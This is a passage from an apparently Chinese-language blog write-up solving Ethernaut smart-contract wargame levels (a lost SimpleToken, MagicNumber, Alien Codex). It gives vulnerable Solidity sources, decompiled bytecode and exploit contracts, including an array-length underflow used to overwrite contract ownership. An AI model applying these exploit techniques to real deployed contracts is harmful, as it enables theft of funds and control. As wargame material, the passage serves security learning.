</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-2">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-2">#</a></h2>
<p>没看懂题目是啥意思？也不说清楚啥地址lost了。考的是暴露的selfdestruct？</p>
<h2 id="exp-5">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-5">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">SimpleToken</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">destroy</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">_to</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdED8992B6FEF8BEB0326Ef93dc34E5e7Ba2dF78C</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">hacker</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">payable</span> (<span style="color:#ae81ff">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">SimpleToken</span>(<span style="color:#a6e22e">target</span>).<span style="color:#a6e22e">destroy</span>(<span style="color:#a6e22e">hacker</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-18-magicnumber">Level 18. MagicNumber<a hidden class="anchor" aria-hidden="true" href="#level-18-magicnumber">#</a></h1>
<blockquote>
<p>To solve this level, you only need to provide the Ethernaut with a &ldquo;Solver&rdquo;, a contract that responds to &ldquo;whatIsTheMeaningOfLife()&rdquo; with the right number.</p>
</blockquote>
<blockquote>
<p>The solver&rsquo;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&rsquo; really really itty-bitty tiny: 10 opcodes at most.</p>
</blockquote>
<h2 id="source-12">Source<a hidden class="anchor" aria-hidden="true" href="#source-12">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">MagicNum</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">solver</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>() <span style="color:#66d9ef">public</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setSolver</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_solver</span>) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">solver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_solver</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ____________/\\\_______/\\\\\\\\\_____        
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     __________/\\\\\_____/\\\///////\\\___       
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ________/\\\/\\\____\///______\//\\\__      
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       ______/\\\/\/\\\______________/\\\/___     
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        ____/\\\/__\/\\\___________/\\\//_____    
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         __/\\\\\\\\\\\\\\\\_____/\\\//________   
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">          _\///////////\\\//____/\\\/___________  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            ___________\///_____\///////////////__
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-3">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-3">#</a></h2>
<p>意思是只要返回42就行？</p>
<p>bytes类型永远会在首部存储长度字段的</p>
<h2 id="exp-6">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-6">#</a></h2>
<p>emmm用mstore8是过不了的，必须用mstore</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">MagicNum</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setSolver</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_solver</span>) <span style="color:#a6e22e">external</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Solver</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            602a push 42
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            6000 push 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            52   mstore
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            6020 push 0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            6000 push 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            f3   return
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;602a60005260206000f3&#39;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>(<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">code</span>,<span style="color:#ae81ff">0x20</span>),<span style="color:#a6e22e">mload</span>(<span style="color:#a6e22e">code</span>))
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {   
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8FD22bb410240144B69382a85157630f52537FbB</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">solver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Solver</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">MagicNum</span>(<span style="color:#a6e22e">target</span>).<span style="color:#a6e22e">setSolver</span>(<span style="color:#a6e22e">solver</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#a6e22e">solver</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-19-alien-codex">Level 19. Alien Codex<a hidden class="anchor" aria-hidden="true" href="#level-19-alien-codex">#</a></h1>
<blockquote>
<p>You&rsquo;ve uncovered an Alien contract. Claim ownership to complete the level.</p>
</blockquote>
<h2 id="source-13">Source<a hidden class="anchor" aria-hidden="true" href="#source-13">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.5</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;../helpers/Ownable-05.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">AlienCodex</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">Ownable</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">contact</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bytes32</span>[] <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">codex</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">contacted</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>(<span style="color:#a6e22e">contact</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">make_contact</span>() <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">contact</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">record</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_content</span>) <span style="color:#a6e22e">contacted</span> <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>  	<span style="color:#a6e22e">codex</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">_content</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">retract</span>() <span style="color:#a6e22e">contacted</span> <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">codex</span>.<span style="color:#a6e22e">length</span><span style="color:#f92672">--</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">revise</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">i</span>, <span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">_content</span>) <span style="color:#a6e22e">contacted</span> <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">codex</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_content</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="analysis-4">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-4">#</a></h2>
<p>看一下反编译的revise和retract发现可以直接用retract整数下溢后用revise任意storage写。</p>
<p>逆向的结果：在索引数组<code>codex[i] = _content</code>时总会有边界检查，<code>codex.length--</code>会把新旧之间的数组元素全部清零。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">retract</span>() { <span style="color:#75715e">//检查contacted修饰符
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">storage</span>[<span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x0100</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">0x14</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) { <span style="color:#a6e22e">assert</span>(); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">storage</span>[<span style="color:#ae81ff">0x01</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x02d2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x01</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">func_06E5</span>(<span style="color:#a6e22e">var2</span>, <span style="color:#a6e22e">var3</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">func_06E5</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg0</span>, <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>;<span style="color:#75715e">//1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">storage</span>[<span style="color:#a6e22e">temp0</span>]; <span style="color:#75715e">// s[1]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp1</span>;<span style="color:#75715e">// s[1] : 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg1</span>;<span style="color:#75715e">// -1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">storage</span>[<span style="color:#a6e22e">temp0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp2</span>; <span style="color:#75715e">// newlen : 0xff..fff
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">var0</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">temp2</span>) {  <span style="color:#75715e">//如果 oldlen &lt;= newlen
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">label_070C</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>; <span style="color:#75715e">// 整数下溢，走这条分支
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> { <span style="color:#75715e">// 可能是pop数组的操作，把减掉之后和原来长度之间的storage全部变成0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>;  <span style="color:#75715e">// 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x20</span>]); <span style="color:#75715e">//base addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp3</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">var0</span>; <span style="color:#75715e">// large addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x070b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp3</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg1</span>; <span style="color:#75715e">// small addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp4</span>; <span style="color:#75715e">// large addr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">func_0711</span>(<span style="color:#a6e22e">var1</span>, <span style="color:#a6e22e">var2</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> <span style="color:#a6e22e">label_070C</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">func_0711</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg0</span>, <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg1</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">r0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>; <span style="color:#75715e">// large
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arg0</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0733</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg1</span>; <span style="color:#75715e">// small
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">arg1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp0</span>; <span style="color:#75715e">// large
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp1</span>; <span style="color:#75715e">//small
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">arg1</span> <span style="color:#f92672">&lt;=</span> <span style="color:#a6e22e">var0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">func_072F</span>(<span style="color:#a6e22e">arg1</span>, <span style="color:#a6e22e">var0</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">label_0720</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">var0</span>; <span style="color:#75715e">// small
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">storage</span>[<span style="color:#a6e22e">temp2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>; <span style="color:#75715e">// 置0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">temp2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x01</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">arg1</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">var0</span>) { <span style="color:#66d9ef">goto</span> <span style="color:#a6e22e">label_0720</span>; }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">arg0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">func_072F</span>(<span style="color:#a6e22e">arg1</span>, <span style="color:#a6e22e">var0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Error: Could not resolve method call return address!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">func_072F</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg0</span>, <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg1</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">r0</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arg0</span>; }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">revise</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg0</span>, <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">arg1</span>) { <span style="color:#75715e">// 4 args
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">temp0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arg0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">temp0</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>];  <span style="color:#75715e">// i
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">arg1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span><span style="color:#f92672">:</span><span style="color:#a6e22e">temp0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>];  <span style="color:#75715e">// content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">storage</span>[<span style="color:#ae81ff">0x00</span>] <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x0100</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">0x14</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) { <span style="color:#a6e22e">assert</span>(); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">var2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg0</span>;  <span style="color:#75715e">// i
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">var2</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">storage</span>[<span style="color:#a6e22e">var1</span>]) { <span style="color:#a6e22e">assert</span>(); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">var1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">storage</span>[<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">memory</span>[<span style="color:#ae81ff">0x00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0x20</span>]) <span style="color:#f92672">+</span> <span style="color:#a6e22e">var2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">var0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exp-7">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-7">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>In [<span style="color:#ae81ff">16</span>]: w3<span style="color:#f92672">.</span>keccak(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">0x20</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">16</span>]: HexBytes(<span style="color:#e6db74">&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">17</span>]: w3<span style="color:#f92672">.</span>eth<span style="color:#f92672">.</span>get_storage_at(target,<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">17</span>]: HexBytes(<span style="color:#e6db74">&#39;0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">18</span>]: <span style="color:#ae81ff">0x10000000000000000000000000000000000000000000000000000000000000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">18</span>]: <span style="color:#ae81ff">35707666377435648211887908874984608119992236509074197713628505308453184860938</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [<span style="color:#ae81ff">19</span>]: hex(_)
</span></span><span style="display:flex;"><span>Out[<span style="color:#ae81ff">19</span>]: <span style="color:#e6db74">&#39;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#39;</span>
